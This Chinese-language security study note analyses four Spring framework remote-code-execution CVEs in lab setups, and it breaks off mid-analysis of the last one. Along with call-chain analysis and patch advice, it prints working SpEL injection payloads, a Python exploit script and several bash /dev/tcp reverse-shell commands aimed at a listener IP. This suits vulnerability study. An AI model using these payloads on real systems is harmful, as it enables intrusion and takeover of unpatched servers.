# Spring框架漏洞学习

# 一、了解Spring

`Spring`框架是一个开放源代码的`J2EE`应用程序框架，是针对`bean`的生命周期进行管理的轻量级容器。`Spring`可以单独应用于构筑应用程序，也可以和`Struts`、`Webwork`、`Tapestry`等众多Web框架组合使用，并且可以与 `Swing`等桌面应用程序AP组合。

`Spring`框架主要由七部分组成，分别是`Spring Core`、`Spring AOP`、`Spring ORM`、`Spring DAO`、`Spring Context`、`Spring Web`和`Spring Web MVC`。

![Untitled](Spring%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%203d362525b9e74007a42187b1557561d2/Untitled.png)

由于`Spring`全家桶包含的内容非常庞大，这里主要介绍其中关键的`5`个部分：

1. `Spring Framework`
也就是我们经常说的`spring`框架，包括了`ioc`依赖注入，`Context`上下文、`bean`管理、`springmvc`等众多功能模块，其它`spring`项目比如`spring boot`也会依赖`spring`框架。
2. `SpringBoot`
它的目标是简化`Spring`应用和服务的创建、开发与部署，简化了配置文件，使用嵌入式`web`服务器，含有诸多开箱即用的微服务功能，可以和`spring cloud`联合部署。`Spring Boot`的核心思想是约定大于配置，应用只需要很少的配置即可，简化了应用开发模式。
3. `Spring Data`
是一个数据访问及操作的工具集，封装了多种数据源的操作能力，包括：`jdbc`、`Redis`、`MongoDB`等。
4. `SpringCloud`
是一套完整的微服务解决方案，是一系列不同功能的微服务框架的集合。`Spring Cloud`基于`Spring Boot`，简化了分布式系统的开发，集成了服务发现、配置管理、消息总线、负载均衡、断路器、数据监控等各种服务治理能力。比如`sleuth`提供了全链路追踪能力，`Netflix`套件提供了`hystrix`熔断器、`zuul`网关等众多的治理组件。`config`组件提供了动态配置能力，`bus`组件支持使用`RabbitMQ`、`kafka`、`Activemq`等消息队列，实现分布式服务之间的事件通信。
5. `Spring Security`
主要用于快速构建安全的应用程序和服务，在`Spring Boot`和`Spring Security OAuth2`的基础上，可以快速实现常见安全模型，如单点登录，令牌中继和令牌交换。可以了解一下`oauth2`授权机制和`jwt`认证方式。`oauth2`是一种授权机制，规定了完备的授权、认证流程。`JWT`全称是`JSON Web Token`，是一种把认证信息包含在`token`中的认证实现，`oauth2`授权机制中就可以应用`jwt`来作为认证的具体实现方法。

# 二、六个漏洞案例分析

## (1)****Spring Security OAuth2 远程命令执行漏洞（CVE-2016-4977）****

**漏洞原理：**`Spring Security OAuth`是为`Spring`框架提供安全认证支持的一个模块。在其使用`whitelabel views`来处理错误时，由于使用了`Springs Expression Language (SpEL)`，攻击者在被授权的情况下可以通过构造恶意参数来远程执行命令。

**影响版本：**`Spring Security OAuth 2.0 – 2.0.9`、`Spring Security OAuth 1.0 – 1.0.5`

**复现过程：**

1. 访问`http://your-ip:8080/oauth/authorize?response_type=${233*233}&client_id=acme&scope=openid&redirect_uri=http://test`*。*首先需要填写用户名和密码，我们这里填入`admin:admin`即可。可以看到，我们输入是`SpEL`表达式`${233*233}`已经成功执行并返回结果：

![Untitled](Spring%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%203d362525b9e74007a42187b1557561d2/Untitled%201.png)

![Untitled](Spring%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%203d362525b9e74007a42187b1557561d2/Untitled%202.png)

1. 使用`poc.py`来实现反弹`shell`

其中，`poc.py`的代码如下：

```python
#!/usr/bin/env python

message = input('Enter message to encode:')

poc = '${T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(%s)' % ord(message[0])

for ch in message[1:]:
   poc += '.concat(T(java.lang.Character).toString(%s))' % ord(ch) 

poc += ')}'

print(poc)
```

```python
bash -i >& /dev/tcp/另外一台服务器的IP/8899 0>&1
```

```python
bash -c {echo,把上面的给base64编码}|{base64,-d}|{bash,-i}
```

利用`poc.py`进行加密：

![Untitled](Spring%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%203d362525b9e74007a42187b1557561d2/Untitled%203.png)

复制下来，替换原网址中的`233*233`，访问网址：

![Untitled](Spring%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%203d362525b9e74007a42187b1557561d2/Untitled%204.png)

成功反弹shell：

![Untitled](Spring%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%203d362525b9e74007a42187b1557561d2/Untitled%205.png)

**知识补充：SpEL可以执行什么内容呢？**

![Untitled](Spring%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%203d362525b9e74007a42187b1557561d2/Untitled%206.png)

**修复建议：**

1. 使用1.0.x版本的用户应放弃在认证通过和错误这两个页面中使用Whitelabel这个视图；
2. 使用2.0.x版本的用户升级到2.0.10以及更高的版本。

## (2)****Spring Messaging 远程命令执行漏洞（CVE-2018-1270）****

**漏洞原理：**`Spring messaging`为`spring`框架提供消息支持，其上层协议是`STOMP`，底层通信基于`SockJS`。在`spring messaging`中，其允许客户端订阅消息，并使用`selector`过滤消息。`selector`用`SpEL`表达式编写，并使用`StandardEvaluationContext`解析，造成命令执行漏洞。

该漏洞本质是`Spel`表达式注入，`Spel`表达式注入的关键代码为：

```python
String expression = "T(java.lang.Runtime).getRuntime().exec(/"calc/")";  
String result = parser.parseExpression(expression).getValue().toString();
```

连接后端服务器的流程，可以理解为：
①用`STOMP`协议将数据组合成一个文本流
②用`sockjs`协议发送文本流，`sockjs`会选择一个合适的通道：`websocket`或`xhr`(`http`)，与后端通信
所以我们可以使用`http`来复现漏洞，称之为“降维打击”；因为该漏洞是订阅的时候插入SpEL表达式，而对方向这个订阅发送消息时才会触发，所以我们需要指定的信息有：
①基础地址，在`vulhub`中为`http://靶机IP:8080/gs-guide-websocket`
②待执行的`SpEL`表达式，如`T(java.lang.Runtime).getRuntime().exec('touch /tmp/success')`
③某一个订阅的地址，如`vulhub`中为：`/topic/greetings`
④如何触发这个订阅，即如何让后端向这个订阅发送消息。在`vulhub`中，我们向`/app/hello`发送一个包含`name`的`json`，即可触发这个事件。当然在实战中就不同了，所以这个`poc`并不具有通用性。

**影响版本：**Spring Framework 5.0 to 5.0.4、Spring Framework 4.3 to 4.3.14

**复现过程（版本一）【vulhub】：**

1. 打开页面：

![Untitled](Spring%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%203d362525b9e74007a42187b1557561d2/Untitled%207.png)

1. 直接利用`exp`，注意修改监听`IP`和靶机地址：

```python
#!/usr/bin/env python3
import requests
import random
import string
import time
import threading
import logging
import sys
import json
 
logging.basicConfig(stream=sys.stdout, level=logging.INFO)
 
def random_str(length):
    letters = string.ascii_lowercase + string.digits
    return ''.join(random.choice(letters) for c in range(length))
 
 
class SockJS(threading.Thread):
    def __init__(self, url, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.base = f'{url}/{random.randint(0, 1000)}/{random_str(8)}'
        self.daemon = True
        self.session = requests.session()
        self.session.headers = {
            'Referer': url,
            'User-Agent': 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)'
        }
        self.t = int(time.time()*1000)
 
    def run(self):
        url = f'{self.base}/htmlfile?c=_jp.vulhub'
        response = self.session.get(url, stream=True)
        for line in response.iter_lines():
            time.sleep(0.5)
     
    def send(self, command, headers, body=''):
        data = [command.upper(), '\n']
 
        data.append('\n'.join([f'{k}:{v}' for k, v in headers.items()]))
         
        data.append('\n\n')
        data.append(body)
        data.append('\x00')
        data = json.dumps([''.join(data)])
 
        response = self.session.post(f'{self.base}/xhr_send?t={self.t}', data=data)
        if response.status_code != 204:
            logging.info(f"send '{command}' data error.")
        else:
            logging.info(f"send '{command}' data success.")
 
    def __del__(self):
        self.session.close()
 
 
sockjs = SockJS('http://你的靶机IP:8080/gs-guide-websocket')
sockjs.start()
time.sleep(1)
 
sockjs.send('connect', {
    'accept-version': '1.1,1.0',
    'heart-beat': '10000,10000'
})
sockjs.send('subscribe', {
    'selector': 'T(java.lang.Runtime).getRuntime().exec(new String[]{"/bin/bash","-c","exec 5<>/dev/tcp/你的监听器的IP/监听端口;cat <&5 | while read line; do $line 2>&5 >&5; done"})',
    'id': 'sub-0',
    'destination': '/topic/greetings'
})
 
data = json.dumps({'name': 'vulhub'})
sockjs.send('send', {
    'content-length': len(data),
    'destination': '/app/hello'
}, data)
```

得到：

![Untitled](Spring%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%203d362525b9e74007a42187b1557561d2/Untitled%208.png)

![Untitled](Spring%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%203d362525b9e74007a42187b1557561d2/Untitled%209.png)

**复现过程（版本二）【本地搭建demo】：**

1. 拉取`demo`：

```bash
git clone https://github.com/spring-guides/gs-messaging-stomp-websocket.git
```

1. `IDEA`打开项目：

![Untitled](Spring%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%203d362525b9e74007a42187b1557561d2/Untitled%2010.png)

然后用`maven`把项目跑起来：

![Untitled](Spring%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%203d362525b9e74007a42187b1557561d2/Untitled%2011.png)

![Untitled](Spring%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%203d362525b9e74007a42187b1557561d2/Untitled%2012.png)

![Untitled](Spring%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%203d362525b9e74007a42187b1557561d2/Untitled%2013.png)

![Untitled](Spring%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%203d362525b9e74007a42187b1557561d2/Untitled%2014.png)

1. 两种方法触发漏洞

**方法一：`app.js`中写入`Payload`：**

在`complete/src/main/resources/static/app.js`第`15`行代码后加上如下代码，增加了一个`header`，指定了一个带有`payload`的`selector`，第24行改为：`},header);`

```java
var header  = {"selector":"T(java.lang.Runtime).getRuntime().exec('calc.exe')"};
```

![Untitled](Spring%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%203d362525b9e74007a42187b1557561d2/Untitled%2015.png)

![Untitled](Spring%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%203d362525b9e74007a42187b1557561d2/Untitled%2016.png)

会弹出计算器，但是不知道为什么我的没有弹；如果您知道原因，可以私聊我，微信W01fh4cker。

**方法二：抓包根据`Stomp`协议发送`Payload`：**

访问`8080`端口页面，点击`connect`后进行抓包，修改请求报文，插入如下字段（`payload`）：

```jsx
\nselector:new java.lang.ProcessBuilder('calc.exe').start()
```

![Untitled](Spring%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%203d362525b9e74007a42187b1557561d2/Untitled%2017.png)

回到页面，文本框随意输入，点击send，即可触发payload。

![Untitled](Spring%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%203d362525b9e74007a42187b1557561d2/Untitled%2018.png)

方法二我没有进行复现，这两张图均为网图。

**原理分析：**

先了解下`Spring WebSocket`和`STOMP`协议：`websocket`只定义了文字和字节俩种形式的消息格式，没有像`http`协议那样子有那么丰富的协议规范，`websocket`之所以没有自己定义那么多的协议格式，是希望有框架自己来实现定义这些格式，我们称之为`websocket`的子协议，`sub-protocol`。
`STOMP`(`Streaming Text Orientated Message Protocol`)，是流文本定向消息协议，是一种为`MOM`(`Message Oriented Middleware`，面向消息的中间件)设计的简单文本协议。`Spring Websocket`利用`STOMP`作为`websocket`的子协议，原因是`stomp`可以提供一种类似`springmvc`的编码方式，可以利用注解进行接收和发送消息以及和`springmvc`进行无缝的结合。
`Spring WebSocket`使用STOMP协议进行推送，其核心思想就是订阅(`subscribe`)，允许客户端订阅消息，使用`selector`过滤消息。

示例代码：

```jsx
selector = 'T(java.lang.Runtime).getRuntime().exec("cp /etc/passwd /tmp")'  
stompClient = Stomp.client('ws://localhost:8080/hello')  
stompClient.connect({}, function(frame) {  
    stompClient.subscribe('/topic/greetings', function() {}, {  
        "selector": selector  
    })  
});
```

当订阅时，`Spring`会储存这个`selector`，并在客户端收到消息的时候触发。
我们搭建的测试环境的`demo`中，`app.js`运行在客户端，与服务器做WebSocket交互，使用`connect()`方法建立`Stomp`连接，所以在漏洞利用方法一中，我们更改`app.js`中`connect()`中的代码，增加了一个带有`header`头部，指定了一个带有`payload`的`selector`，最终`payload`被执行。
第二种漏洞利用方法原理相同，更改`websocket`中的订阅(`subscribe`),增加带有`payload`的`selector`。

简单分析如下：

1. websocket中增加带有payload的selector

函数调用如下图所示：

![Untitled](Spring%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%203d362525b9e74007a42187b1557561d2/Untitled%2019.png)

该流程是对消息进行处理，直接查看`DefaultSubscriptionRegistry`类中的`addSubscriptionInternal()`方法：

```java
protected void addSubscriptionInternal(String sessionId, String subsId, String destination, Message<?> message) {  
        Expression expression = null;  
        MessageHeaders headers = message.getHeaders();  
        String selector = SimpMessageHeaderAccessor.getFirstNativeHeader(this.getSelectorHeaderName(), headers);  
        if(selector != null) {  
        try {  
                expression = this.expressionParser.parseExpression(selector);  
        this.selectorHeaderInUse = true;  
        if(this.logger.isTraceEnabled()) {  
        this.logger.trace("Subscription selector: [" + selector + "]");  
                }  
            } catch (Throwable var9) {  
        if(this.logger.isDebugEnabled()) {  
        this.logger.debug("Failed to parse selector: " + selector, var9);  
                }  
            }  
        }  
        this.subscriptionRegistry.addSubscription(sessionId, subsId, destination, expression);  
        this.destinationCache.updateAfterNewSubscription(destination, sessionId, subsId);  
    }
```

对`selector`值进行解析，保存在此次会话中：

![Untitled](Spring%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%203d362525b9e74007a42187b1557561d2/Untitled%2020.png)

1. **在[`http://127.0.0.1:8080/`](https://link.zhihu.com/?target=http%3A//localhost%3A8080/)点击`Send`向服务器发送任意消息**

点击`send`发送任意消息，`Spring`经过一系列处理，开始对消息的订阅者分发消息，先看`SimpleBrokerMessageHandler`类中的`sendMessageToSubscribers()`方法，`message`参数保存了此次会话的相关信息：

![Untitled](Spring%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%203d362525b9e74007a42187b1557561d2/Untitled%2021.png)

进入`AbstractSubscriptionRegistry`类的`findSubscriptions()`方法，然后进入`DefaultSubscriptionRegistry`类的`findSubscriptionsInternal()`方法，代码如下：

```java
protected MultiValueMap<String, String> findSubscriptionsInternal(String destination, Message<?> message) {  
        LinkedMultiValueMap result = this.destinationCache.getSubscriptions(destination, message);  
        return this.filterSubscriptions(result, message);  
    }
```

跟入`filterSubscriptions()`方法，关键代码如下：

```java
DefaultSubscriptionRegistry.Subscription sub;  
do {  
    DefaultSubscriptionRegistry.SessionSubscriptionInfo info;  
 do {  
 if(!var7.hasNext()) {  
 continue label59;  
        }  
 
        subId = (String)var7.next();  
        info = this.subscriptionRegistry.getSubscriptions(sessionId);  
    } while(info == null);  
 
    sub = info.getSubscription(subId);  
} while(sub == null);  
Expression expression = sub.getSelectorExpression();
```

根据两次`getSubscriptions()`，取出之前的配置，保存在`sub`变量中。

[https://www.notion.so](https://www.notion.so)

```java
Expression expression = sub.getSelectorExpression();
```

利用上述代码将`selector`取出，进入到如下代码：

```java
try {  
 if(Boolean.TRUE.equals(expression.getValue(context, Boolean.class))) {  
        result.add(sessionId, subId);  
    }  
}
```

可以看到，执行了关键代码：

```java
expression.getValue(context,Boolean.class)
```

触发了`payload`，执行了`spel`表达式。造成`RCE`。

## (3)****Spring Data Commons 远程命令执行漏洞（CVE-2018-1273）****

**漏洞原理：**`Spring Data`是一个用于简化数据库访问，并支持云服务的开源框架，`Spring Data Commons`是`Spring Data`下所有子项目共享的基础框架。`Spring Data Commons`在2.0.5及以前版本中，存在一处`SpEL`表达式注入漏洞，攻击者可以注入恶意`SpEL`表达式以执行任意命令。

**影响版本：**Spring Data Commons 1.13 - 1.13.10 (Ingalls SR10)、Spring Data Commons 2.0 to 2.0.5 (Kay SR5)、Spring Data REST 2.6 - 2.6.10 (Ingalls SR10)、Spring Data REST 3.0 - 3.0.5 (Kay SR5)

**复现过程：**

1. 访问http://your-ip:8080/users，可以看到一个用户注册页面：

![Untitled](Spring%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%203d362525b9e74007a42187b1557561d2/Untitled%2022.png)

用户名和密码随便填，然后抓包：

![Untitled](Spring%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%203d362525b9e74007a42187b1557561d2/Untitled%2023.png)

`poc`如下，注意反弹`shell`的部分需要`url`编码：

```bash
username[#this.getClass().forName("java.lang.Runtime").getRuntime().exec("/bin/bash+-c+$%40|bash+0+echo+bash+-i+>%26/dev/tcp/反弹shell的监听IP/监听端口+0>%261")]=&password=&repeatedPassword=
```

![Untitled](Spring%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%203d362525b9e74007a42187b1557561d2/Untitled%2024.png)

反弹`shell`成功：

![Untitled](Spring%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%203d362525b9e74007a42187b1557561d2/Untitled%2025.png)

**漏洞分析：**

1. 执行以下代码后，以`spring-data-examples\pom.xml`创建一个`demo`环境，用`maven`启动项目：

```bash
git clone https://github.com/spring-projects/spring-data-examples.git
cd spring-data-examples
git checkout 05bc950a46eaa687cb3eaf0489015cea668a5013
cd ..\web\example
mvn spring-boot:run
```

![Untitled](Spring%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%203d362525b9e74007a42187b1557561d2/Untitled%2026.png)

![Untitled](Spring%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%203d362525b9e74007a42187b1557561d2/Untitled%2027.png)

```bash
username[#this.getClass().forName("java.lang.Runtime").getRuntime().exec('calc.exe')]=&password=&repeatedPassword=
```

![Untitled](Spring%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%203d362525b9e74007a42187b1557561d2/Untitled%2028.png)

1. 分析问题

看到官方的补丁：https://github.com/spring-projects/spring-data-commons/commit/ae1dd2741ce06d44a0966ecbd6f47beabde2b653，补丁大致的意思是将`StandardEvaluationContext`替代为`SimpleEvaluationContext`，由于`StandardEvaluationContext`权限过大，可以执行任意代码，会被恶意用户利用；而`SimpleEvaluationContext`的权限则小的多，只支持一些`map`结构，通用的`jang.lang.Runtime`、`java.lang.ProcessBuilder`都已经不再支持。

![Untitled](Spring%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%203d362525b9e74007a42187b1557561d2/Untitled%2029.png)

于是决定从`setPropertyValue`入手，下断点，发现`propertyName`就是我们的`payload`：

![Untitled](Spring%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%203d362525b9e74007a42187b1557561d2/Untitled%2030.png)

查看这个方法后面的代码可以发现：

![Untitled](Spring%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%203d362525b9e74007a42187b1557561d2/Untitled%2031.png)

红框里面有：

```java
Expression expression = PARSER.parseExpression(propertyName);
```

然后就是：

```java
try {
				expression.setValue(context, value);
			} catch (SpelEvaluationException o_O) {
				throw new NotWritablePropertyException(type, propertyName, "Could not write property!", o_O);
			}
		}
```

初始化`expression`并调用`setValue`，这是典型的`SPEL`导致`RCE`。

从其他地方我们很难分析，于是决定倒推：寻找调用`MapDataBinder`类的位置。发现方法在这个文件里面：[spring-data-commons/ProxyingHandlerMethodArgumentResolver.java at main · spring-projects/spring-data-commons (github.com)](https://github.com/spring-projects/spring-data-commons/blob/main/src/main/java/org/springframework/data/web/ProxyingHandlerMethodArgumentResolver.java)

![Untitled](Spring%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%203d362525b9e74007a42187b1557561d2/Untitled%2032.png)

我们把这段代码拿出来，先放这边：

```java
public class ProxyingHandlerMethodArgumentResolver extends ModelAttributeMethodProcessor
		implements BeanFactoryAware, BeanClassLoaderAware {
......
@Override
protected Object createAttribute(String attributeName, MethodParameter parameter, WebDataBinderFactory binderFactory,
        NativeWebRequest request) throws Exception {

    MapDataBinder binder = new MapDataBinder(parameter.getParameterType(), conversionService.getObject());
    binder.bind(new MutablePropertyValues(request.getParameterMap()));

    return proxyFactory.createProjection(parameter.getParameterType(), binder.getTarget());
......
}
```

我们在`spring-data-examples\web\example\src\main\java\example\users\web`下的`UserController.java`中可以看到：

![Untitled](Spring%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%203d362525b9e74007a42187b1557561d2/Untitled%2033.png)

`83`、`84`这两行代码：

```java
@RequestMapping(method = RequestMethod.POST)
public Object register(UserForm userForm, BindingResult binding, Model model){
	……
}
```

注意到这里出现了`UserForm`、`BindingResult`和`Model`。经过查询得知，在处理类似如下代码的时候，`ProxyingHandlerMethodArgumentResolver`将会被使用。

```java
interface Form {
@NotBlank String getName();
@NotBlank String getText();
}
@Controller
@RequestMapping(value = "/guestbook")
class GuestbookController {
@RequestMapping(method = RequestMethod.GET)
String guestbook(Form form, Model model) { … }
@RequestMapping(method = RequestMethod.POST)
String guestbook(@Valid Form form, Errors errors, Model model) { … }
}
```

`SpringMVC`框架的调用规则：`SpringDataWebConfiguration`类的特性被启用的时候，会将 `ProxyingHandlerMethodArgumentResolver`注册到容器中去.

```java
publicvoidaddArgumentResolvers(List<HandlerMethodArgumentResolver> argumentResolvers) {

    argumentResolvers.add(sortResolver());
    argumentResolvers.add(pageableResolver());

    ProxyingHandlerMethodArgumentResolver resolver =new ProxyingHandlerMethodArgumentResolver(conversionService,true);
    resolver.setBeanFactory(context);
    forwardBeanClassLoader(resolver);

    argumentResolvers.add(resolver);
}

```

当`SpringMVC`得到一个请求的时候，会遍历容器中注册的`HandlerMethodArgumentResolver`调用他们的`supportsParameter`方法，由于我们的参数是一个`Interface`(接口)，那么 `ProxyingHandlerMethodArgumentResolver`就会告诉调用方它支持这个参数的解析，也就是说 `supportsParameter`会返回`true`。

```java
publicbooleansupportsParameter(MethodParameter parameter) {

if (!super.supportsParameter(parameter)) {
returnfalse;
    }

    Class<?> type = parameter.getParameterType();

if (!type.isInterface()) {
returnfalse;
    }
    ......

```

`ProxyingHandlerMethodArgumentResolver`在拿到参数的时候会创建一个`MapDataBinder`来解析参数`MapDataBinder.bind()`方法。连带进行`doBind`操作，最终会调用到`setPropertyValue`方法来，最后在`expression.setValue(context, value)`的时候触发了漏洞。

补充，`username`，`password`，`repeatedPassword`字段都可以添加漏洞利用代码；`[]`是嵌套属性的写法，在`[]`中间可以写入表达式，先找到`username`，这个也是跟这个表单属性绑定的，相关代码：

```java
interface UserForm {
String getUsername();
String getPassword();
String getRepeatedPassword();
}
```

## (4)****Spring Cloud Gateway Actuator API SpEL表达式注入命令执行（CVE-2022-22947）****

**漏洞原理：**`Spring Cloud Gateway`是`Spring`中的一个`API`网关。其`3.1.0和3.0.6`版本及以前存在一处`SpEL`表达式注入漏洞，当攻击者可以访问`Actuator API`的情况下，将可以利用该漏洞执行任意命令。

**影响版本：**Spring Cloud Gateway 3.1.0、Spring Cloud Gateway 3.0.0 - 3.0.6、Spring Cloud Gateway 其他已不再更新的版本

复现过程：

1. 打开之后构造包含恶意请求的路由：

```java
POST /actuator/gateway/routes/hacktest HTTP/1.1
Host: 你的靶机IP:8080
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like 		Gecko) Chrome/97.0.4692.71 Safari/537.36
Connection: close
Content-Type: application/json
Content-Length: 310

{
  "id": "hacktest",
 "filters": [{
"name": "AddResponseHeader",
"args": {
  "name": "Result",
  "value": "#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\"whoami\"}).getInputStream()))}"
}
  }],
  "uri": "http://example.com"
}
```

![Untitled](Spring%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%203d362525b9e74007a42187b1557561d2/Untitled%2034.png)

1. 应用刚添加的路由发送如下数据包：

```java
POST /actuator/gateway/refresh HTTP/1.1
Host: 你的靶机IP:8080
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like 		Gecko) Chrome/97.0.4692.71 Safari/537.36
Connection: close
Content-Type: application/json
Content-Length: 312

{
  "id": "hacktest",
 "filters": [{
"name": "AddResponseHeader",
"args": {
  "name": "Result",
  "value": "#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\"whoami\"}).getInputStream()))}"
}
  }],
  "uri": "http://example.com"
}
```

![Untitled](Spring%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%203d362525b9e74007a42187b1557561d2/Untitled%2035.png)

1. 发送如下数据包查看结果：

```java
GET /actuator/gateway/routes/hacktest HTTP/1.1
Host: 你的靶机IP:8080
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 2
```

![Untitled](Spring%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%203d362525b9e74007a42187b1557561d2/Untitled%2036.png)

**漏洞分析：**

1. 查看官方的漏洞补丁https://github.com/spring-cloud/spring-cloud-gateway/commit/337cef276bfd8c59fb421bfe7377a9e19c68fe1e：

文件位于：`org/springframework/cloud/gateway/support/ShortcutConfigurable.java`

![Untitled](Spring%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%203d362525b9e74007a42187b1557561d2/Untitled%2037.png)

通过查看修复补丁以及对比原文件，此修复的地方是`ShortcutConfigurable`接口的`getValue`方法中的`StandardEvaluationContext`类，将此类换成了`GatewayEvaluationContext`类，而`GatewayEvaluationContext`类是自定义的且继承`EvaluationContext`接口`GatewayEvaluationContext`
类内部是对`SimpleEvaluationContext`类的一些调用封装等。

还是俩老熟人，`StandardEvaluationContext`类支持更全面的SpEL功能；而`SimpleEvaluationContext`类：基本的`SpEL`功能，仅支持`SpEL`语言语法的一个子集，例如排除对`Java`类型、构造函数和`bean`引用。

1. 调用链分析：

直接打包下载`3.0.5`版本文件：[spring-cloud/spring-cloud-gateway at v3.0.5 (github.com)](https://github.com/spring-cloud/spring-cloud-gateway/tree/v3.0.5)，然后在IDEA中打开；我们先从漏洞修复的地方开始看，也就是`spring-cloud-gateway-3.0.5\spring-cloud-gateway-server\src\main\java\org\springframework\cloud\gateway\support`下的`ShortcutConfigurable`接口的`getValue`方法：

![Untitled](Spring%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%203d362525b9e74007a42187b1557561d2/Untitled%2038.png)

```java
static Object getValue(SpelExpressionParser parser, BeanFactory beanFactory, String entryValue)
```

这里写的很清楚，此处会被执行`SpEL`表达式。那我们就看看那些地方调用了这个，我们选中`getValue`方法并且`ctrl+alt+h`查看被调用情况：

![Untitled](Spring%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%203d362525b9e74007a42187b1557561d2/Untitled%2039.png)

仔细看可以发现，有三个枚举常数对`getValue`方法进行调用并且都在`ShortcutConfigurable`接口中，而且三处都对`normalize`方法进行重写：

![Untitled](Spring%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%203d362525b9e74007a42187b1557561d2/Untitled%2040.png)

选择第一个，继续向上追踪，查看哪些地方对`normalize`方法进行了调用，这次进入到了`ConfigurationService`类的内部类`ConfigurableBuilder`中的`normalizeProperties`方法，而`normalizeProperties`方法调用了`normalize`方法：

![Untitled](Spring%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%203d362525b9e74007a42187b1557561d2/Untitled%2041.png)

`ConfigurationService`类的内部类`AbstractBuilder`中的`bind`方法调用了`normalizeProperties`方法：

![Untitled](Spring%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%203d362525b9e74007a42187b1557561d2/Untitled%2042.png)

![Untitled](Spring%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%203d362525b9e74007a42187b1557561d2/Untitled%2043.png)

